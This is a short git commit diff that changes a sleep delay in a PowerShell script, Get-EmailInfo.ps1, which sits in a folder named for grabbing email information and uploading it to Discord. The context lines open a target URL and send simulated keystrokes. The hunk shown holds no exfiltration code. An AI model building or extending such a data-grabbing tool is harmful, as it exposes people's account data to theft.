3ec7907f9c3f7d35c14b4aa7ca1e8000bac03d3e
CaliNux <132522491+calinux-py@users.noreply.github.com>
2023-07-31 17:20:59 -0700

    Update Get-EmailInfo.ps1

--- Email Info Grab & Discord Upload/Get-EmailInfo.ps1
+++ Email Info Grab & Discord Upload/Get-EmailInfo.ps1
@@ -5,7 +5,7 @@ function Get-EmailInfo {
 
     Start-Process $targetURL
 
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 3
 
     # Press the down arrow 3 times
     [System.Windows.Forms.SendKeys]::SendWait("{DOWN 8}")
